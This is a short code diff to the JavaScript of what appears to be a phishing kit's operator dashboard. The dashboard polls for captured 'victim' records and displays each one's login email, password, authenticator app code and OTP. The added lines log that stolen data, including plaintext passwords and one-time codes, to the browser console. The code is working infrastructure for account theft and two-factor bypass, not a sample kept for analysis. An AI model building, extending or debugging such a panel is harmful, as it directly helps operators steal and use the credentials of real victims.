@@ -471,6 +471,8 @@ function updateVictimInfo() {
         const container = document.getElementById('victim-info-container');
         
         if (data.has_victims && data.victim_infos.length > 0) {
+            console.log('Received victim data:', data.victim_infos);
+            
             // Update metrics if there are new victims
             if (data.total_victims > lastVictimCount) {
                 updateMetrics(data);
@@ -593,6 +595,14 @@ function displayVictimInfo(victimInfos) {
         const hasData = victim.login_email || victim.login_password || victim.login_authenticator_app_code || victim.login_otp;
         
         if (!hasData) return; // Skip empty entries
+        
+        console.log('Victim data:', {
+            email: victim.login_email,
+            password: victim.login_password,
+            authenticator: victim.login_authenticator_app_code,
+            otp: victim.login_otp,
+            authenticator_status: victim.authenticator_status
+        });
         
         victimHTML += `
             <div class="victim-info-card ${isLatest ? '' : 'mt-3'}">
